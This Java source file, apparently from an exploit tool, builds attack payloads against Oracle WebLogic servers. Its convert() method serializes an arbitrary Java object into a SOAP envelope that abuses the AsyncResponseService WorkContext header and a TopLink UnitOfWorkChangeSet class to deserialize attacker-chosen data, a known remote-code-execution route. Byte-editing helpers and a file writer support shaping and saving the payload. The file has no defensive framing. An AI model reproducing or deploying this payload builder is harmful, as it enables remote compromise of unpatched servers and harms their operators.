package utils;

import java.io.*;

public class Util {
    public static String convert(Object obj) {
        try {
            byte[] bytes;
            if (obj.getClass().isAssignableFrom( byte[].class )){
                bytes = (byte[]) obj;
            }else {
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(baos);
                oos.writeObject(obj);
                bytes = baos.toByteArray();
            }
            String res = "";
            for (int i = 0; i < bytes.length; i++){
                res += String.format("                            <void index=\"%d\">\n" +
                        "                                <byte>%s</byte>\n" +
                        "                            </void>\n", i, bytes[i]);
            }

            res = String.format("<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\n" +
                    "                  xmlns:wsa=\"http://www.w3.org/2005/08/addressing\"\n" +
                    "                  xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\">\n" +
                    "    <soapenv:Header>\n" +
                    "        <wsa:Action>xx</wsa:Action>\n" +
                    "        <wsa:RelatesTo>xx</wsa:RelatesTo>\n" +
                    "        <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\">\n" +
                    "            <java>\n" +
                    "                <class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>\n" +
                    "                        <array class=\"byte\" length=\"%d\">\n" +
                    "%s\n" +
                    "                        </array>\n" +
                    "                    </void>\n" +
                    "                </class>\n" +
                    "            </java>\n" +
                    "        </work:WorkContext>\n" +
                    "    </soapenv:Header>\n" +
                    "    <soapenv:Body>\n" +
                    "        <asy:onAsyncDelivery/>\n" +
                    "    </soapenv:Body>\n" +
                    "</soapenv:Envelope>", bytes.length, res);

            return res;
        }catch (Exception e){
            e.printStackTrace();
            return "";
        }
    }
    public static void writeFile(String file, String content) {
        try {

            BufferedWriter bw = new BufferedWriter(new FileWriter(file));
            bw.write(content);
            bw.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    public static byte[] deleteAt(byte[] bs, int index) {
        int length = bs.length - 1;
        byte[] ret = new byte[length];

        if(index == bs.length - 1) {
            System.arraycopy(bs, 0, ret, 0, length);
        } else if(index < bs.length - 1) {
            for(int i = index; i < length; i++) {
                bs[i] = bs[i + 1];
            }

            System.arraycopy(bs, 0, ret, 0, length);
        }

        return ret;
    }

    public static byte[] addAtIndex(byte[] bs, int index, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, index);
        ret[index] = b;
        System.arraycopy(bs, index, ret, index + 1, length - index - 1);

        return ret;
    }

    public static byte[] addAtLast(byte[] bs, byte b) {
        int length = bs.length + 1;
        byte[] ret = new byte[length];

        System.arraycopy(bs, 0, ret, 0, length-1);
        ret[length - 1] = b;

        return ret;
    }
}
